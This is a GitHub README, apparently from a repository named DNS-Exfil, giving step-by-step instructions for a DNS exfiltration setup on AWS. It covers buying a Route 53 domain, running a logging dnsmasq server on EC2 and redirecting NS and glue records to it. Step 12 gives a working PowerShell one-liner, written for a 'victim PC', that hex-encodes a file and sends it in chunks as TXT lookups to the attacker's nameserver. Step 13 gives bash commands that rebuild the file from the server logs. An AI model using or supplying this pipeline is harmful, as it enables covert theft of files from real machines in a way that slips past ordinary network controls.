# DNS Exfil
DNS Exfiltration Setup on AWS

## Step 1: Purchase Domain Name on Route 53
Verify your email!

## Step 2: Create EC2 instance to host DNS service and logging
Use Amazon Linux OS, or any Linux OS of your preference.
Logging will contain DNS requests with encoded information, which we can then grep and cut later.

## Step 3: Create Security Groups
Inbound - Allow ICMP, TCP DNS, UDP DNS, SSH  
Outbound - Any  

## Step 4: Install dnsmasq on EC2 instance and configure it
`sudo yum install dnsmasq`  
`sudo nano /etc/dnsmasq.conf`  
  
Then input the content below into /etc/dnsmasq.conf, right at the bottom of the config file    
  
listen-address=<EC2's private IP>  
address=/#/<EC2's public IP>  
log-queries  
log-facility=/var/log/dnsmasq.log  
  
Restart the VM, or use the commands below to restart dnsmasq  
`ps -aux | grep dnsmasq`  
`sudo kill <pid of dnsmasq>`  
`sudo systemctl restart systemd-networkd.service`  
`sudo dnsmasq`  

![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/b0cfaf2f-93c0-4967-957c-cd3269241435)
  

## Step 5: Go to Route 53 config, note down default SOA and NS records  
Route 53 > click Hosted zones  
  
![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/50f03726-cfaf-4c20-b2c4-b5f1186cc1ee)


## Step 6: In Route 53 config, create 2x A Record to point NS record to your EC2 instance
**Record Name:** ns1.<yourdomain.com>  
**Type:** A  
**Value:** <your EC2 public IP address>  
**TTL:** 300  

**Record Name:** ns2.<yourdomain.com>  
**Type:** A  
**Value:** <your EC2 public IP address>
**TTL:** 300  

## Step 7: Modify existing NS Record to point to your NS records, which point to your EC2 instance
**Record Name:** <yourdomain.com>  
**Type:** NS  
**Value:**  
ns1.<yourdomain.com>  
ns2.<yourdomain.com>  
**TTL:** 60  

## Step 8: Modify existing SOA record to point to your NS record, which points to your EC2 instance
**Record Name:** <yourdomain.com>  
**Type:** SOA  
**Value:** ns1.<yourdomain.com>. admin.<yourdomain.com> 1 7200 900 1209600 86400  
**TTL:** 60  

  
## Step 9: Modify glue records
In Route 53, click on Registered domains > click Actions > Edit name servers

![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/ca4d78ab-49ac-4880-bbfc-755626bd8bcf)  
    

Note down the current name server settings before making any modifications  

![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/35cf3290-b494-45de-9752-fea7e57e7f91)


Once current settings noted down, change it to point to your own DNS server then Save.  
**Name Server:** ns1.<yourdomain.com>  
**Glue Records:** <your EC2 public IP address>  
  
![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/90d99de8-7099-4c4c-be81-5d9a8b68df3e)
  

## Step 10: Use CMD to nslookup as a test
Launch cmd prompt on victim PC then run the command below  
`nslookup -q=TXT 17April2024206pm.<yourdomain.com> ns1.<yourdomain.com>`  
  
![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/1cf48904-5c60-4e33-924d-108513b1b5e4)


## Step 11: Check your DNS logs in EC2
In EC2 DNS server, run the command below and observe your nslookup query being logged.
`sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"`  


## Step 12: Powershell command to hex encode a file, split, and do nslookup
Launch powershell prompt on victim PC then run command below.  
   
`cd <to folder holding file to exfiltrate>`  
`certutil -encodehex <file to exfiltrate> encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `


## Step 13: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
In EC2 DNS server, run the commands below to combine assemble hex into file.  

`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
`sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  

